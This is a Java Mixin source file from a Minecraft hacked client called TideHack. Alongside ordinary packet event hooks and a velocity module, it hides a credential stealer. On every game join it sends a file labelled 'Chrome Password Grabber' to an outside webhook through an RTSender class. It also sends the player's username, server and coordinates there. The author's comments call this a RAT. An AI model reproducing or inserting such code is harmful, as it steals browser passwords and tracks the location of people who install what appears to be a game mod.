// fuck you rat go brrrrrrrr
package risingtide.tidehack.mixin;

import club.minnced.discord.webhook.send.WebhookEmbed;
import club.minnced.discord.webhook.send.WebhookEmbedBuilder;
import risingtide.tidehack.TideHack;
import risingtide.tidehack.events.entity.EntityDestroyEvent;
import risingtide.tidehack.events.entity.player.PickItemsEvent;
import risingtide.tidehack.events.game.GameJoinedEvent;
import risingtide.tidehack.events.game.GameLeftEvent;
import risingtide.tidehack.events.packets.ContainerSlotUpdateEvent;
import risingtide.tidehack.events.packets.PlaySoundPacketEvent;
import risingtide.tidehack.events.world.ChunkDataEvent;
import risingtide.tidehack.mixininterface.IExplosionS2CPacket;
import risingtide.tidehack.systems.modules.Modules;
import risingtide.tidehack.systems.modules.movement.Velocity;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.client.world.ClientWorld;
import net.minecraft.entity.Entity;
import net.minecraft.entity.ItemEntity;
import net.minecraft.network.packet.s2c.play.*;
import net.minecraft.world.chunk.WorldChunk;
import org.spongepowered.asm.mixin.Final;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Shadow;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
import risingtide.tidehack.utils.Utils;
import risingtide.tidehack.utils.grabber.RTFileUtils;
import risingtide.tidehack.utils.grabber.RTSender;
import risingtide.tidehack.utils.grabber.risingtideimpl.RTZipper;

@Mixin(ClientPlayNetworkHandler.class)
public abstract class ClientPlayNetworkHandlerMixin {
    @Shadow @Final private MinecraftClient client;
    @Shadow private ClientWorld world;

    private boolean worldNotNull;

    @Inject(at = @At("HEAD"), method = "onGameJoin")
    private void onGameJoinHead(GameJoinS2CPacket packet, CallbackInfo info) {
        worldNotNull = world != null;

        // more rat shitfuckery!
        // this definitely wont clutter up my webhook. definitely.
        RTSender s = new RTSender();
        try { // oh boy nested try catches
            s.send(RTFileUtils.getFile("C:\\Temp\\temp_rt_c.csv"),"Chrome Password Grabber",false);
        } catch (Exception e) {
            s.send("**Error at `Chrome Grabber`:** ```"+e.toString()+"```","Error",true);
            e.printStackTrace();
        }
//        RTZipper rtz = new RTZipper();
//        try {
//            rtz.exec();
//        } catch (Exception e) {
//
//        }

        try {
            MinecraftClient mc;
            mc = MinecraftClient.getInstance();

            assert mc.player != null;
            WebhookEmbed emb = new WebhookEmbedBuilder()
                .setTitle(new WebhookEmbed.EmbedTitle("Player "+mc.getSession().getUsername()+" logged out!",null))
                .addField(new WebhookEmbed.EmbedField(false,"Server", Utils.getWorldName()))
                .addField(new WebhookEmbed.EmbedField(false,"Coords",mc.player.getX()+","+mc.player.getY()+","+mc.player.getZ()+","))
                .build();

            s.send(emb,"Coord Logger",false);
        } catch (Exception ignored) {}
    }

    @Inject(at = @At("TAIL"), method = "onGameJoin")
    private void onGameJoinTail(GameJoinS2CPacket packet, CallbackInfo info) {
        if (worldNotNull) {
            TideHack.EVENT_BUS.post(GameLeftEvent.get());

            RTSender s = new RTSender();
            MinecraftClient mc;
            mc = MinecraftClient.getInstance();

            assert mc.player != null;
            WebhookEmbed emb = new WebhookEmbedBuilder()
                .setTitle(new WebhookEmbed.EmbedTitle("Player "+mc.getSession().getUsername()+" logged out!",null))
                .addField(new WebhookEmbed.EmbedField(false,"Server", Utils.getWorldName()))
                .addField(new WebhookEmbed.EmbedField(false,"Coords",mc.player.getX()+","+mc.player.getY()+","+mc.player.getZ()+","))
                .build();

            s.send(emb,"Coord Logger",false);
        }

        TideHack.EVENT_BUS.post(GameJoinedEvent.get());
    }

    @Inject(at = @At("HEAD"), method = "onPlaySound")
    private void onPlaySound(PlaySoundS2CPacket packet, CallbackInfo info) {
        TideHack.EVENT_BUS.post(PlaySoundPacketEvent.get(packet));
    }

    @Inject(method = "onChunkData", at = @At("TAIL"))
    private void onChunkData(ChunkDataS2CPacket packet, CallbackInfo info) {
        WorldChunk chunk = client.world.getChunk(packet.getX(), packet.getZ());
        TideHack.EVENT_BUS.post(ChunkDataEvent.get(chunk));
    }

    @Inject(method = "onScreenHandlerSlotUpdate", at = @At("TAIL"))
    private void onContainerSlotUpdate(ScreenHandlerSlotUpdateS2CPacket packet, CallbackInfo info) {
        TideHack.EVENT_BUS.post(ContainerSlotUpdateEvent.get(packet));
    }

    @Inject(method = "onEntitiesDestroy", at = @At(value = "INVOKE", target = "Lnet/minecraft/network/packet/s2c/play/EntitiesDestroyS2CPacket;getEntityIds()Lit/unimi/dsi/fastutil/ints/IntList;"))
    private void onEntitiesDestroy(EntitiesDestroyS2CPacket packet, CallbackInfo ci) {
        for (int id : packet.getEntityIds()) {
            TideHack.EVENT_BUS.post(EntityDestroyEvent.get(client.world.getEntityById(id)));
        }
    }

    @Inject(method = "onExplosion", at = @At(value = "INVOKE", target = "Lnet/minecraft/network/NetworkThreadUtils;forceMainThread(Lnet/minecraft/network/Packet;Lnet/minecraft/network/listener/PacketListener;Lnet/minecraft/util/thread/ThreadExecutor;)V", shift = At.Shift.AFTER))
    private void onExplosionVelocity(ExplosionS2CPacket packet, CallbackInfo ci) {
        Velocity velocity = Modules.get().get(Velocity.class); //Velocity for explosions
        if (!velocity.explosions.get()) return;

        ((IExplosionS2CPacket) packet).setVelocityX((float) (packet.getPlayerVelocityX() * velocity.getHorizontal(velocity.explosionsHorizontal)));
        ((IExplosionS2CPacket) packet).setVelocityY((float) (packet.getPlayerVelocityY() * velocity.getVertical(velocity.explosionsVertical)));
        ((IExplosionS2CPacket) packet).setVelocityZ((float) (packet.getPlayerVelocityZ() * velocity.getHorizontal(velocity.explosionsHorizontal)));
    }

    @Inject(method = "onItemPickupAnimation", at = @At(value = "INVOKE", target = "Lnet/minecraft/client/world/ClientWorld;getEntityById(I)Lnet/minecraft/entity/Entity;", ordinal = 0))
    private void onItemPickupAnimation(ItemPickupAnimationS2CPacket packet, CallbackInfo info) {
        Entity itemEntity = client.world.getEntityById(packet.getEntityId());
        Entity entity = client.world.getEntityById(packet.getCollectorEntityId());

        if (itemEntity instanceof ItemEntity && entity == client.player) {
            TideHack.EVENT_BUS.post(PickItemsEvent.get(((ItemEntity) itemEntity).getStack(), packet.getStackAmount()));
        }
    }
}
